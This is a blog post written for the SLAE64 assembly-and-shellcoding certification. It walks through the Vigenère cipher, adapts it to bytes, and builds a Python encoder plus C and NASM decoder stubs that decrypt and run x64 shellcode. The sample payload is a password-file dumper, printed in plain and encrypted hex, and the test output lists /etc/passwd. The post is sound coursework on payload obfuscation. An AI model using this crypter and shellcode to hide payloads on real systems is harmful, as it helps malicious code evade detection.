+++
title = "Security Tube SLAE64 Course - Assessment 7 - Payload Encryption"
author = "Codehead"
layout = "post"
date = "2017-11-28T16:32:52"
url = "/slae64-07-payload-encryption/"
categories = [ "SLAE64", "Assembler", "Shellcode", "linux", "Python", "C" ]
tags = [ "shellcode", "assembler", "linux", "x64" ]
+++

After completing the video lectures of the [Security Tube Linux 64 bit Assembler Expert course (SLAE64)](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html), a series of assessments must be completed to gain certification. This is the seventh and final assignment; build a payload encrypter/decrypter.

We have used payload encoders in previous assignments, but this time we will build a hidden payload that requires a key to decrypt.

The choice of encryption method is left to the student. I spent a good while looking at the various encryption methods:

  * [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) - A modern and widely used [block cipher](https://en.wikipedia.org/wiki/Block_cipher) scheme. Very complex to implement and would probably require a 3rd party library, making the assignment pretty pointless.
  * [RC4](https://en.wikipedia.org/wiki/RC4) - A fast and relatively easy to implement [stream cipher](https://en.wikipedia.org/wiki/Stream_cipher). Unfortunately, Vivek used RC4 in his demo, I didn't want to repeat his work.
  * <a href='https://en.wikipedia.org/wiki/FISH_(cipher)'>FISH</a>, <a href='https://en.wikipedia.org/wiki/Scream_(cipher)'>Scream</a>, [MUGI](https://en.wikipedia.org/wiki/MUGI), etc - Complex, limited implementation documentation (my maths isn't up to scratch).

While researching these schemes I stumbled onto some of the more [classical cryptography](https://en.wikipedia.org/wiki/Classical_cipher) schemes.

While modern crypto schemes produce streams or blocks of pseudo-random noise which is generally XORed against the cleartext, classical ciphers tended to use relocation or shifting of characters. Simple rotational schemes such as [Caesar's cipher](https://en.wikipedia.org/wiki/Caesar_cipher) or [ROT13](https://en.wikipedia.org/wiki/ROT13) barely qualify as encryption, the encoding operation is either fixed or easily brute forced. However, a [Substitution Cipher](https://en.wikipedia.org/wiki/Substitution_cipher) requires a mapping table and 
this can be varied, forming a kind of key, although a large and cumbersome one.

The [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) is a hybrid of substitution and rotation using a table built on an ascending rotation factor. However, it also makes use of a variable length key and so it is suitable for our needs.

<!--more-->

## How the Vigenère Cipher Works

The basic Vigenère cipher uses a [Tabula recta](https://en.wikipedia.org/wiki/Tabula_recta) or letter grid as a lookup table to combine the plaintext and key to produce the ciphertext.

![Lookup grid](img/vig_grid.png)

To encrypt the cleartext 'HELLO! I AM A TEST MESSAGE.' with the key 'TOPSECRET', we take the letter 'H' from the plaintext and find the corrsponding row in the grid. Then we take the letter 'T' from the key and find the corresponding column. Where the row and column intersect, we find the first letter of the ciphertext: 'A'.

We repeat this process for each letter of the plaintext, using the next letter of the key each time. If the key is shorter than the plaintext, we simply wrap around and restart at the beginning of the string. Note that spaces and punctuation in the cleartext are not transformed, this cipher is purely for the encryption of character data.

After completing the encryption process, the complete ciphertext is: 'ASADS! K RQ T MSHL QGJWTZS.'.

Reversing Vigenère encryption involves finding the row on the grid that corresponds to the first letter of the key, then finding the letter within the row that corresponds to the first letter of the ciphertext. Once the letter is located, look up to find the column letter that is the cleartext value. Repeat this process, repeating the key string as before until the message is revealed.

### A Python Implementation

To implement the Vigenère process in code, my first instinct was to build a lookup table of the Tabula recta in memory. However, as the row offsets are constant, I figured I could just calculate the positions on the fly. This turned out to be much easier than I expected.

Looking down the left edge of the lookup table, we see that the row ID letter corresponds with the first letter in that row. If we build a simple alphabetical array, we can look up the numeric position of a letter within the array and use that as the starting point, effectively creating the offset grid row.

{{< highlight python >}}
table = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
message = "HELLO, I AM A TEST MESSAGE!"

for ch in message:
  row_offset = table.find(ch)
{{</ highlight >}}

The same principle applies to the column index; the ID values across the top of the grid are a numerical offset. We can look up the numeric position of the key letter and use that as an offset on top of the row offset:

{{< highlight python >}}
import itertools

keytext = "TOPSECRET"

key = itertools.cycle(keytext)

for ch in message:
  col_offset = table.find(next(key))
{{</ highlight >}}

The <tt>itertools.cycle</tt> generator simply outputs a character from the key string each time <tt>next()</tt> is called. Looping back to the start is automatically handled for us.

To find the ciphertext character, we simply add these two offsets together and find the letter at that position. We also carry out a modulus 26 to keep the value in the range of the alphabet array, simulating the wrap around that occurs in the row data.

{{< highlight python >}}
import itertools

table = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
message = "HELLO, I AM A TEST MESSAGE!"
keytext = "TOPSECRET"
# Expected result - "ASADS, K RQ T MSHL QGJWTZS!"

key = itertools.cycle(keytext)
cipher_text = bytearray()
for ch in message:
  row_offset = table.find(ch)
  col_offset = table.find(next(key))
  cipher_text.append(ord(table[(row_offset+col_offset)%26]))

print(cipher_text.decode('utf-8'))
{{</ highlight >}}

However, this does not give the expected result:

{{< highlight text >}}
>>> ASADSBQMSTAOSDVVWMSATKWCXIS
{{</ highlight >}}

The first part is right, but it goes downhill fast because we are not taking account of the non-alphabetical characters. A quick test to see if the plaintext character we're processing is in the array fixes the problem:

{{< highlight python >}}
import itertools

table = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

message = "HELLO, I AM A TEST MESSAGE!"
keystr = "TOPSECRET"
# Expected result - "ASADS, K RQ T MSHL QGJWTZS!"

# Encrypt
key = itertools.cycle(keystr)
cipher_text = bytearray()
for ch in message:
  if ch in table:
    row_offset = table.find(ch)
    col_offset = table.find(next(key))
    cipher_text.append(ord(table[(row_offset+col_offset)%26]))
  else:
    cipher_text.append(ord(ch))

print(cipher_text.decode('utf-8'))
{{</ highlight >}}
&nbsp;
{{< highlight text >}}
>>> ASADS, K RQ T MSHL QGJWTZS!
{{</ highlight >}}

I was actually surprised at how compact the encoder turned out to be. Python's excellent substring handling makes the processing quite easy. 

### Decoding

Extracting the plaintext from the ciphertext is simply case of reversing the operation. The column offset is subtracted from the row offset. Again, a mod 26 is required to keep things in range.

{{< highlight python >}}
import itertools

table = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

cipher_text = "ASADS, K RQ T MSHL QGJWTZS!"
keystr = "TOPSECRET"

# Decrypt
key = itertools.cycle(keystr)
clear_text = bytearray()
for ch in cipher_text:
  if ch in table:
    row_offset = table.find(ch)
    col_offset = table.find(next(key))
    clear_text.append(ord(table[(row_offset-col_offset)%26]))
  else:
    clear_text.append(ord(ch))

print(clear_text.decode('utf-8'))
{{</ highlight >}}
&nbsp;
{{< highlight text >}}
>>> HELLO, I AM A TEST MESSAGE!
{{</ highlight >}}

The complete Python demo is hosted on GitHub: [VigenèreDemo.py](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_7/vig_demo.py)

### Cipher Weaknesses and Problems with Binary Data

Vigenère is surprisingly strong for a classical cipher. However, there are a number of attacks which are effective against the method:

 * Key length guessing is possible by examining the ciphertext for repeating patterns.
 * Frequency analysis is effective against large sections of ciphertext.
 * Plain old brute forcing of the key is also possible, but keys can be any length, even the same length as the plaintext.

A bigger problem our application is that the basic cipher only deals with upper-case alphabetic characters, we need to encrypt binary data.

### Modifying the Method

Looking at the Python code above, it is not difficult to extend the 26 x 26 grid to a 256 x 256 grid. This allows all possible values for an 8 bit byte to be covered and actually helps prevent some of the attacks on the method as we are no longer dealing with predictable, human readable plaintext.

This modification of the Vigenère method actually results in even more compact code. As we're using the numeric value of each byte as the offset, we no longer need the alphabet lookup table, we simply add the byte values together and apply a mod 256.


{{< highlight python >}}
import itertools
import sys

def main():
  message = b"HELLO, I AM A TEST MESSAGE!"
  keytext = b"TOPSECRET"

  ciphertext = encrypt(message, keytext)

  for h in ciphertext:
    sys.stdout.write('\\' + hex(h)[1:])


def encrypt(clear_text, keystr):
  key = itertools.cycle(keystr)
  cipher_text = bytearray()
  for ch in clear_text:
    offset = next(key)
    cipher_text.append((ch+offset)%256)

  return cipher_text
{{</ highlight >}}
&nbsp;
{{< highlight text >}}
\x9c\x94\x9c\x9f\x94\x6f\x72\x8e\x74\x95\x9c\x70\x94\x65\x97\x97\x98\xa8\x74\x9c\x95\xa6\x98\x84\x99\x8a\x75
{{</ highlight >}}

Decryption is a simple matter of flipping the operation by subtracting the offset:

{{< highlight python >}}
def decrypt(cipher_text, keystr):
  key = itertools.cycle(keystr)
  clear_text = bytearray()
  for ch in cipher_text:
    offset = next(key)
    clear_text.append((ch-offset)%256)

  return clear_text
{{</ highlight >}}
&nbsp;
{{< highlight text >}}
\x48\x45\x4c\x4c\x4f\x2c\x20\x49\x20\x41\x4d\x20\x41\x20\x54\x45\x53\x54\x20\x4d\x45\x53\x53\x41\x47\x45\x21
HELLO, I AM A TEST MESSAGE!
{{</ highlight >}}

Again, the complete binary Vigenère demo is hosted on GitHub: [Vigenère256.py](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_7/vig256_demo.py) 

This modified Vigenère method seems ideal for implementation in our shellcode. We can encrypt binary data with a key and the decryption routine is not going to be huge when written into a decoder header.

## C Decoder

Using the [Shellcode Wrapper](https://github.com/CodeheadUK/SLAE64/blob/master/misc/shellcode_wrapper.c) as a starting point, we can build a decoder for Vigenère256 encrypted payloads.

The Vigenère256 demo can be easily tweaked to produce a [shellcode cryptor](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_7/vig256_encoder.py).

Taking the shellcode from the password dumper developed in [Assignment 6](/Ass6) and pushing it through the crypter with a key string gives us our payload:

{{< highlight text >}}
MBP:slae64$ python vig256_encoder.py 0x68,0x73,0x77,0x64,0x01,0x48,0xbb,0x2f,
  0x65,0x74,0x63,0x2f,0x70,0x61,0x73,0x53,0x48,0x89,0xe7,0xfe,0x4f,0x0b,0x6a,
  0x02,0x48,0x29,0xf6,0x58,0x0f,0x05,0x50,0x48,0x96,0x50,0x5a,0x5f,0x66,0x81,
  0xea,0x01,0xf0,0x48,0x29,0xd4,0x48,0x8d,0x34,0x24,0x0f,0x05,0x6a,0x01,0x5a,
  0x48,0x92,0x50,0x5f,0x0f,0x05,0x6a,0x3c,0x58,0x0f,0x05 TOPSECRET

Hex Shellcode
0xbc,0xc2,0xc7,0xb7,0x46,0x8b,0x0d,0x74,0xb9,0xc8,
0xb2,0x7f,0xc3,0xa6,0xb6,0xa5,0x8d,0xdd,0x3b,0x4d,
0x9f,0x5e,0xaf,0x45,0x9a,0x6e,0x4a,0xac,0x5e,0x55,
0xa3,0x8d,0xd9,0xa2,0x9f,0xb3,0xba,0xd0,0x3a,0x54,
0x35,0x8b,0x7b,0x19,0x9c,0xe1,0x83,0x74,0x62,0x4a,
0xad,0x53,0x9f,0x9c,0xe6,0x9f,0xaf,0x62,0x4a,0xad,
0x8e,0x9d,0x63,0x59,

C Style Array
"\xbc\xc2\xc7\xb7\x46\x8b\x0d\x74\xb9\xc8"
"\xb2\x7f\xc3\xa6\xb6\xa5\x8d\xdd\x3b\x4d"
"\x9f\x5e\xaf\x45\x9a\x6e\x4a\xac\x5e\x55"
"\xa3\x8d\xd9\xa2\x9f\xb3\xba\xd0\x3a\x54"
"\x35\x8b\x7b\x19\x9c\xe1\x83\x74\x62\x4a"
"\xad\x53\x9f\x9c\xe6\x9f\xaf\x62\x4a\xad"
"\x8e\x9d\x63\x59";
{{</ highlight >}}

The decryption key is provided as an argument to the program. We don't have Python's awesome string handling now, so we need to set up a pointer for each string and length variables to control the loops:

{{< highlight c >}}
  int keyLen, keyPtr;
  int ctLen, ctPtr;
 
  // Set up pointers and limits
  char *key = argv[1];
  keyPtr = 0;
  keyLen = strlen(key);
  ctLen = strlen(code);
{{</ highlight >}}

Then it is just a case of running the Vigenère decode over the payload:

{{< highlight c >}}
  for(ctPtr=0; ctPtr < ctLen; ctPtr++)
  {
    // Decode the payload byte
    code[ctPtr] = (code[ctPtr]-key[keyPtr]) % 256;
    
    // Increment and loop the key string
    keyPtr++;
    if(keyPtr >= keyLen)
    {
      keyPtr=0;
    }
  
  }
{{</ highlight >}}

The full code is at [vigenere.c](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_7/vigenere.c). Testing the code shows that the crypter is working properly and the shellcode is decoded correctly.

{{< highlight text >}}
karl@ubuntu:~/SLAE64/assignment_7$ ./vigenere 
Please provide a key string
karl@ubuntu:~/SLAE64/assignment_7$ ./vigenere NOTTHEPASSWORD
Segmentation fault (core dumped)
karl@ubuntu:~/SLAE64/assignment_7$ ./vigenere TOPSECRET
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
{{</ highlight >}}

## Assembler Version

Just for fun, let's build a pure shellcode version of the decrypter. We can't use arguments when executing shellcode so the payload will have to request the decryption key when it runs.

<tt>SYS_WRITE</tt> and <tt>SYS_READ</tt> calls are used to prompt for the key and get input.

{{< highlight nasm >}}
; Prompt for key
mov ebx, 0x0a3f7965   ; Build a prompt string
shl rbx, 8
add rbx, 0x4b
push rbx
mov rsi, rsp          ; Get prompt string addr
push 5
pop rdx               ; String length
push 1
pop rax
syscall               ; sys_write

; Read response
push 64               ; Max string size
pop rdx
add rsp, rdx          ; Make room on the stack
mov rsi, rsp          ; Pointer to stack space
xor rax, rax          ; Clear syscall id
push rax
pop rdi               ; STDIN
syscall               ; sys_read
{{</ highlight >}}

After the key has been provided, <tt>RAX</tt> will contain the length of the input, including the return character. As we need to know the key length for the styring repetition, we can subtract 1 from <tt>RAX</tt> to provide just the length of the text.

{{< highlight nasm >}}
dec rax               ; String length minus newline
{{</ highlight >}}

We use jump, call, pop to get the address of the encoded payload:

{{< highlight nasm >}}
; Get the payload address
jmp _code_marker
 
_decode_start:
pop rdi               ; Payload address
push 59               ; Payload length
pop rcx
xor rdx, rdx          ; Offset value

...

_code_marker:
call _decode_start
_payload:
db 0xbc, 0xc2, 0xc7, 0xb7, 0x46, 0x8b, 0x0d, 0x74, 0xb9, 0xc8
db 0xb2, 0x7f, 0xc3, 0xa6, 0xb6, 0xa5, 0x8d, 0xdd, 0x3b, 0x4d
db 0x9f, 0x5e, 0xaf, 0x45, 0x9a, 0x6e, 0x4a, 0xac, 0x5e, 0x55
db 0xa3, 0x8d, 0xd9, 0xa2, 0x9f, 0xb3, 0xba, 0xd0, 0x3a, 0x54
db 0x35, 0x8b, 0x7b, 0x19, 0x9c, 0xe1, 0x83, 0x74, 0x62, 0x4a
db 0xad, 0x53, 0x9f, 0x9c, 0xe6, 0x9f, 0xaf, 0x62, 0x4a
{{</ highlight >}}

 We also setup a length count in <tt>RCX</tt> and an offset to the key string in <tt>RDX</tt>.

At this point, we have the payload address in <tt>RDI</tt>, the key string address in <tt>RSI</tt>, the payload length in <tt>RCX</tt>, an offset for the key string in <tt>RDX</tt> and the length of the key string in <tt>RAX</tt>. We're all set to perform the Vigenère decode:

{{< highlight nasm >}}
; Vigenere decode
_decode:
mov bl, [rdi]         ; Get a byte from payload
sub bl, [rsi+rdx]     ; Subtract key value
mov [rdi], bl         ; Replace encoded value
{{</ highlight >}}

The last free general register, <tt>RBX</tt> is used to hold the byte value while it is being decoded.

After each decode, we need to move the string pointers. The payload pointer is simple, but we do need to check for wraparound in the key string.

{{< highlight nasm >}}
; Move pointers
inc rdi               ; Encoded data pointer
inc rdx               ; Key offset value

; Check for loop in keystring
cmp al, dl            ; Compare to string length
jne _next
xor rdx, rdx          ; Reset if required

_next:
loop _decode
{{</ highlight >}}

The <tt>LOOP</tt> and <tt>RCX</tt> value take care of terminating the decode loop once the entire payload has been processed. It is then simply a case of jumping to the start of the shellcode:

{{< highlight nasm >}}
jmp _payload          ; Jump to decoded payload
{{</ highlight >}}

A quick test shows that the payload works as expected:

{{< highlight text >}}
MBP:slae64$ ./vig_asm
Key?
NotCorrect
Segmentation fault (core dumped)
karl@ubuntu:~/SLAE64/assignment_7$ ./vig_asm
Key?
TOPSECRET
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
...
{{</ highlight >}}

The encryption key does not have to be typed, it can be piped into the process for interaction free execution:

{{< highlight text >}}
MBP:slae64$  echo TOPSECRET | ./vig_asm 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
{{</ highlight >}}

The complete <tt>nasm</tt> listing for this version of the crypter is on Github: [vigenere.nasm](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_7/vigenere.nasm). I also created a Python script which will encode a shellcode sample and build the decoder and payload shellcode automatically ([Vig_Builder.py](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_7/vig_builder.py))

### Conclusion

This completes the 7th assessment and ends my time on the SLAE4 course. I have immensely enjoyed working through the assignments. I suspect I have learned more by fumbling and experimenting my way though the exercises than I did from watching the videos. However, I would like to thank Vivek and his team for producing an outstanding course which provides a great grounding in x64 assembler, does a great job of demonstrating examples, then steps back and allows you to explore the rest on your own.

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html

Student ID: SLAE64-1471

